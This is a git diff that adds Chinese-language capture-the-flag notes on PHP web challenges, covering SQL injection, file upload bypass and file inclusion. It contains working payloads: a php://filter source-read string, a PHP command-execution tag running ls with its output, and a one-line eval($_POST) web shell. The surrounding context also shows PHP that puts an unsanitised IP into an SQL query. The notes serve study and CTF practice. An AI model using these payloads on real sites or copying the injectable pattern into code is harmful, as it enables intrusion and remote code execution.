@@ -1005,3 +1005,24 @@
 	echo 'your ip is :'.$ip;
 	$sql="insert into client_ip (ip) values ('$ip')";
 	mysql_query($sql);
+
+# 多次
+	又是一个注入题，常规的 and 1=1 啥的都被过滤掉了，多积累姿势
+
+# getshell
+	之前还以为要传马，后面查wp发现是我想多了，只要成功传php文件就能拿到flag
+	顺便学习下文件上传
+	Content-Type: Multipart/form-data + .php5 ???
+
+# 文件包含2
+	直接伪协议试试：php://filter/read=convert.base64-encode/resource=index.php
+	=> NAIVE! 查看源码发现 upload.php => 文件上传
+
+	wp上写的是.php;.jpg，我的直接传个 .gif，然后利用本身的 file=xxx，查看了所传图片，命令就被执行了
+	// 命令执行
+	<script language=php> system("ls")</script>
+	// 牛逼啊，直接能看到本目录下的所有文件
+	about hello.php index.php this_is_th3_F14g_154f65sd4g35f4d6f43.txt upload upload.php
+	还有个思路，传马之后，菜刀连接，此处不用改后缀名也能解析？？
+	// 一句话木马
+	<script language=php>eval($_POST['A'])</script>
